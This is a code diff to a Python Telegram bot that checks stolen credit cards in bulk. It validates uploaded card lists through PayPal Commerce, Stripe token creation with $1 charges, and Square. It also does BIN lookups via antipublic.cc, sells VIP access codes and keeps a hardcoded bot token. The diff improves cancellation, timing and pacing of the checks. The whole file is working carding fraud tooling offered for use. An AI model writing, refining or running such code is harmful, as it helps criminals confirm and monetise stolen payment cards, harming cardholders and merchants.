@@ -19,7 +19,6 @@ from telegram.ext import (
 
 TOKEN = '8031233073:AAGgdXbO9TCxPYdPiedLlT9zGVxIMQFiML4'
 
-# ============ Configs ============
 ADMINS = [6843321125]
 VIP_USERS = {}
 BANNED_USERS = {}
@@ -28,6 +27,7 @@ GATEWAYS = []
 stop_users = {}
 last_check_time = {}
 ANTI_SPAM_SECONDS = 7
+user_tasks = {}
 CODES = {}
 gateway_index = 0
 STRIPE_KEYS = {}
@@ -39,7 +39,6 @@ try:
 except:
     STRIPE_KEYS = {}
 
-# ============ Emojis ============
 PREMIUM_EMOJI_IDS = {
     "✅": "6023660820544623088", "🔥": "5999340396432333728",
     "❌": "6037570896766438989", "⚡": "6026367225466720832",
@@ -47,9 +46,7 @@ PREMIUM_EMOJI_IDS = {
     "📝": "6023660820544623088", "🌐": "6026367225466720832",
     "🎯": "5974235702701853774", "🤖": "6057466460886799210",
     "🤵": "4949560993840629085", "💰": "5971944878815317190",
-    "⏸️": "6001440193058444284", "▶️": "6285315214673975495",
     "🛑": "5420323339723881652", "📊": "5971837723676249096",
-    "📦": "6066395745139824604", "📋": "5974235702701853774",
     "🔄": "5971837723676249096", "⏳": "5971837723676249096",
     "🚀": "6282977077427702833", "⚠️": "5420323339723881652",
     "💎": "6023660820544623088",
@@ -68,7 +65,6 @@ def premium_emoji(text):
 UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
 api_semaphore = asyncio.Semaphore(6)
 
-# ============ BIN Lookup ============
 async def get_bin_info(bin_number):
     urls = [f"https://bins.antipublic.cc/bins/{bin_number}", f"https://lookup.binlist.net/{bin_number}"]
     for url in urls:
@@ -93,7 +89,6 @@ async def get_bin_info(bin_number):
         await asyncio.sleep(0.5)
     return "Unknown", "Unknown", "Unknown"
 
-# ============ PayPal Commerce ============
 class PayPalCommerce:
     def __init__(self, target_url=None):
         self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
@@ -146,13 +141,6 @@ class PayPalCommerce:
             if string.startswith(('A', 'B', 'E')):
                 self.client_id = string
                 return
-        src_matches = re.findall(r'<script[^>]*src="([^"]+)"[^>]*>', html)
-        for src in src_matches:
-            if 'paypal' in src.lower():
-                client_id_match = re.search(r'client-id=([^&"\']+)', src)
-                if client_id_match:
-                    self.client_id = client_id_match.group(1)
-                    return
 
     def _extract_form_data(self, html):
         inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html)
@@ -337,7 +325,6 @@ class PayPalCommerce:
         except Exception as e:
             return f"Error: {e}"
 
-# ============ PayPal Check API ============
 async def check_card_api(card_full, gateway_url):
     async with api_semaphore:
         try:
@@ -356,7 +343,6 @@ async def check_card_api(card_full, gateway_url):
         except Exception as e:
             return "declined", f"Error: {e}"
 
-# ============ Stripe Check ============
 def check_stripe_sync(card, key_id="1"):
     try:
         if not STRIPE_KEYS:
@@ -376,7 +362,6 @@ def check_stripe_sync(card, key_id="1"):
             exp_year = "20" + exp_year
         session = requests.Session()
         session.verify = False
-        # Token
         headers = {"Authorization": f"Bearer {pk}", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
         data = {"card[number]": cc_number, "card[exp_month]": exp_month, "card[exp_year]": exp_year, "card[cvc]": cvc}
         r = session.post("https://api.stripe.com/v1/tokens", headers=headers, data=data, timeout=30)
@@ -392,7 +377,6 @@ def check_stripe_sync(card, key_id="1"):
             else:
                 return error_msg[:50]
         token_id = r.json()["id"]
-        # Charge $1
         headers = {"Authorization": f"Bearer {sk}", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
         data = {"amount": "100", "currency": "usd", "source": token_id, "description": "WAFA"}
         r = session.post("https://api.stripe.com/v1/charges", headers=headers, data=data, timeout=30)
@@ -420,7 +404,6 @@ def check_stripe_sync(card, key_id="1"):
     finally:
         session.close()
 
-# ============ Square Check ============
 def classify_square_error(msg):
     msg_lower = str(msg).lower()
     if 'insufficient' in msg_lower:
@@ -552,7 +535,6 @@ def check_square_sync(card):
     finally:
         session.close()
 
-# ============ Stripe Key Management ============
 async def add_stripe_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMINS:
         return
@@ -589,7 +571,6 @@ async def remove_stripe_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
             json.dump(STRIPE_KEYS, f)
         await update.message.reply_text(premium_emoji(f"✅ Key {key_id} removed!"), parse_mode="HTML")
 
-# ============ Format Responses ============
 async def format_response(card_full, status, response, taken, gateway_url, gateway_num, user_id, mode="Single"):
     bin_number = card_full.split("|")[0][:6]
     info, bank, country = await get_bin_info(bin_number)
@@ -678,7 +659,6 @@ async def format_square_response(card_full, result, taken, user_id, mode="Single
 - - - - - - - - - - - - - - - - - - - - - -
 [⌤] Dev by: WAFA 🍀""")
 
-# ============ Single Checks ============
 async def st_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     ALL_USERS.add(user_id)
@@ -696,10 +676,11 @@ async def st_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     card = context.args[0]
     msg = await update.message.reply_text(premium_emoji("🔄 Checking..."), parse_mode="HTML")
+    start_time = time.time()
     loop = asyncio.get_event_loop()
     result = await loop.run_in_executor(None, check_stripe_sync, card)
-    taken = round(time.time() - time.time(), 2)
-    text = await format_stripe_response(card, result, 0, user_id, "Single")
+    taken = round(time.time() - start_time, 2)
+    text = await format_stripe_response(card, result, taken, user_id, "Single")
     await msg.edit_text(text, parse_mode="HTML")
 
 async def sq_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -716,12 +697,13 @@ async def sq_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     card = context.args[0]
     msg = await update.message.reply_text(premium_emoji("🔄 Checking Square..."), parse_mode="HTML")
+    start_time = time.time()
     loop = asyncio.get_event_loop()
     result = await loop.run_in_executor(None, check_square_sync, card)
-    text = await format_square_response(card, result, 0, user_id, "Single")
+    taken = round(time.time() - start_time, 2)
+    text = await format_square_response(card, result, taken, user_id, "Single")
     await msg.edit_text(text, parse_mode="HTML")
 
-# ============ File Panel ============
 async def handle_file_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     ALL_USERS.add(user_id)
@@ -755,11 +737,12 @@ async def gateway_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = pending_files[user_id]["chat_id"]
     await query.edit_message_text(premium_emoji(f"✅ {gateway_type.upper()} selected! Processing..."), parse_mode="HTML")
     if gateway_type == "paypal":
-        await process_paypal_file(file_path, chat_id, context)
+        task = asyncio.create_task(process_paypal_file(file_path, chat_id, context))
     elif gateway_type == "stripe":
-        await process_stripe_file(file_path, chat_id, context)
+        task = asyncio.create_task(process_stripe_file(file_path, chat_id, context))
     elif gateway_type == "square":
-        await process_square_file(file_path, chat_id, context)
+        task = asyncio.create_task(process_square_file(file_path, chat_id, context))
+    user_tasks[user_id] = task
     del pending_files[user_id]
 
 async def process_paypal_file(file_path, chat_id, context):
@@ -774,7 +757,8 @@ async def process_paypal_file(file_path, chat_id, context):
             lines = f.readlines()
         for line in lines:
             if stop_users.get(user_id):
-                break
+                await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
+                return
             match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
             if not match: continue
             card_full = match[0]
@@ -808,7 +792,10 @@ async def process_paypal_file(file_path, chat_id, context):
             try:
                 await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML")
             except: pass
+            await asyncio.sleep(1)
         await context.bot.send_message(chat_id, premium_emoji("🚀 PayPal complete."), parse_mode="HTML")
+    except asyncio.CancelledError:
+        await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
     except Exception as e:
         await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
 
@@ -827,7 +814,8 @@ async def process_stripe_file(file_path, chat_id, context):
             lines = f.readlines()
         for line in lines:
             if stop_users.get(user_id):
-                break
+                await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
+                return
             match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
             if not match: continue
             card_full = match[0]
@@ -856,7 +844,10 @@ async def process_stripe_file(file_path, chat_id, context):
             try:
                 await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML")
             except: pass
+            await asyncio.sleep(1)
         await context.bot.send_message(chat_id, premium_emoji("🚀 Stripe complete."), parse_mode="HTML")
+    except asyncio.CancelledError:
+        await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
     except Exception as e:
         await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
 
@@ -872,7 +863,8 @@ async def process_square_file(file_path, chat_id, context):
             lines = f.readlines()
         for line in lines:
             if stop_users.get(user_id):
-                break
+                await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
+                return
             match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
             if not match: continue
             card_full = match[0]
@@ -901,14 +893,15 @@ async def process_square_file(file_path, chat_id, context):
             try:
                 await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML")
             except: pass
+            await asyncio.sleep(2)
         await context.bot.send_message(chat_id, premium_emoji("🚀 Square complete."), parse_mode="HTML")
+    except asyncio.CancelledError:
+        await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
     except Exception as e:
         await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
 
-# ============ Guard ============
 async def check_banned_guard(update: Update) -> bool:
-    user_id = update.effective_user.id
-    if BANNED_USERS.get(user_id):
+    if BANNED_USERS.get(update.effective_user.id):
         await update.message.reply_text(premium_emoji("⚠️ Access Denied."), parse_mode="HTML")
         return True
     return False
@@ -919,7 +912,6 @@ def can_user_check(user_id, mode="file"):
     if user_id in VIP_USERS and VIP_USERS[user_id] > time.time(): return True
     return mode == "single"
 
-# ============ Commands ============
 async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
     commands_text = """┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
          ▬▬▬ [ COMMANDS ] ▬▬▬
@@ -980,7 +972,7 @@ async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     stop_users[user_id] = True
-    await update.message.reply_text(premium_emoji("🛑 Stopped."), parse_mode="HTML")
+    await update.message.reply_text(premium_emoji("🛑 Stopping..."), parse_mode="HTML")
 
 async def try_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMINS: return
@@ -1004,11 +996,9 @@ async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ALL_USERS.add(user_id)
     if not context.args: return
     code = context.args[0].upper()
-    if code not in CODES:
-        return
+    if code not in CODES: return
     code_data = CODES[code]
-    if code_data["used"] >= code_data["max_users"]:
-        return
+    if code_data["used"] >= code_data["max_users"]: return
     VIP_USERS[user_id] = int(time.time()) + code_data["duration"] * 86400
     code_data["used"] += 1
     await update.message.reply_text(premium_emoji(f"🚀 VIP activated for {code_data['duration']} days."), parse_mode="HTML")
